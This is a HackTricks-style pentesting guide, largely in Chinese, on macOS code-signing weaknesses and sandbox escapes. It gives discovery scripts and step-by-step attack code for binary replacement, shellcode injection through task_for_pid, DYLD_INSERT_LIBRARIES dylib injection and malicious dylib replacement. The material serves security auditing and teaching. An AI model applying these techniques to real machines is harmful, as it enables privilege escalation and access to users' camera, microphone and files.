# macOS Code Signing Weaknesses & Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### 基本信息

**Ad-hoc signing** (`CS_ADHOC`) 会创建一个没有证书链的代码签名 — 它只是代码的哈希，没有开发者身份验证。该 binary 的来源无法追溯到任何开发者或组织。

在 Apple Silicon Macs 上，所有可执行文件至少需要一个 ad-hoc 签名。这意味着你会在许多开发工具、Homebrew 包和第三方实用程序中发现 ad-hoc 签名。

### 为什么这很重要

- **No verifiable identity** — binary 可以被替换而不会被基于身份的检查检测到
- 第三方 ad-hoc binaries 位于 **privileged positions**（FDA, daemon, helpers）时是高优先级目标
- 在某些配置下，ad-hoc signatures 可能不会像 developer-signed code 那样被严格验证
- 拥有 **TCC grants** 的 ad-hoc signed binaries 尤其有价值 — 即使 binary 内容发生变化，权限授予也会持续（取决于 TCC 如何给授予加键）

### 发现
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### 攻击: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. On next launch, the daemon runs your code with the original's TCC grants
# (This works when TCC keyed the grant by path rather than code signature)
```
---

## 可调试进程 (get-task-allow)

### 基本信息

具有 **`com.apple.security.get-task-allow`** entitlement（或 `CS_GET_TASK_ALLOW` 标志）的进程允许 **任何进程作为 debugger 附加**，读取内存、修改寄存器、注入代码并控制执行。

这仅用于开发构建。但一些第三方二进制在生产环境中仍带有该 entitlement。

> [!CAUTION]
> 一个在生产环境带有 `get-task-allow` 的二进制是一个 **即时利用原语**。任何本地进程都可以调用 `task_for_pid()`，获取目标的 Mach task port，并注入任意代码，该代码以目标的 entitlements、TCC grants 和 security context 运行。

### 发现
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### 攻击： Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## 无库验证 + DYLD 环境

### 致命组合

当一个二进制同时具有**两者**时：
- `com.apple.security.cs.disable-library-validation` (loads any dylib)
- `com.apple.security.cs.allow-dyld-environment-variables` (accepts DYLD env vars)

这就是一个**保证可用的代码注入原语** — `DYLD_INSERT_LIBRARIES` works perfectly。

### 发现
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### 攻击: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Sandbox 临时例外

### 它们如何削弱 Sandbox

Sandbox temporary exceptions (`com.apple.security.temporary-exception.*`) 会在 App Sandbox 中打洞：

| Exception | 它允许的内容 |
|---|---|
| `temporary-exception.mach-lookup.global-name` | 连接到系统范围的 XPC/Mach 服务 |
| `temporary-exception.files.absolute-path.read-write` | 读取/写入 应用容器之外的文件 |
| `temporary-exception.iokit-user-client-class` | 打开 IOKit 用户客户端连接 |
| `temporary-exception.shared-preference.read-only` | 读取其他应用的偏好设置 |
| `temporary-exception.files.home-relative-path.read-write` | 访问相对于 `~` 的路径 |

### Mach-Lookup 异常 = Sandbox Escape Primitive

最危险的例外是 **mach-lookup** — 它允许 sandboxed app 与特权守护进程通信：
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### 攻击：通过 Mach-Lookup 进行沙箱逃逸
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## 私有 Apple Entitlements

### 它们是什么

以 `com.apple.private.*` 为前缀的 Entitlements 提供对未对第三方开发者记录或开放的 **Apple 内部 APIs** 的访问。拥有私有 entitlements 的第三方二进制通常通过 enterprise cert、MDM 或非 App-Store 分发方式获得。

### 危险的私有 Entitlements

| Entitlement | Capability |
|---|---|
| `com.apple.private.tcc.manager` | 对整个 TCC 数据库的读/写 |
| `com.apple.private.tcc.allow` | 访问特定的 TCC 服务 |
| `com.apple.private.security.no-sandbox` | 在无 sandbox 下运行 |
| `com.apple.private.iokit` | 直接访问 IOKit 驱动 |
| `com.apple.private.kernel.\*` | 访问 kernel 接口 |
| `com.apple.private.xpc.launchd.job-label` | 注册/管理 launchd 任务 |
| `com.apple.rootless.install` | 写入受 SIP 保护的路径 |

### 发现
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Custom Sandbox Profiles (SBPL)

### 它们是什么

二进制文件可以随附以 SBPL (Seatbelt Profile Language) 编写的 **自定义 sandbox 配置文件**。这些配置文件可以比默认的 App Sandbox 更严格，或者 **更宽松**。

### 审计自定义配置文件
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## 可写的库路径

### 它们是什么

当一个 binary 从当前用户可以 **write to** 的 path 加载 dynamic library 时，该 library 可以被替换为恶意代码。

### 发现
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### 攻击：Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## 参考资料

* [Apple Developer — Code Signing Guide](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
* [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
* [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
* [The Evil Bit — clear-library-validation](https://theevilbit.github.io/posts/com.apple.private.security.clear-library.validation/)

{{#include ../../../banners/hacktricks-training.md}}
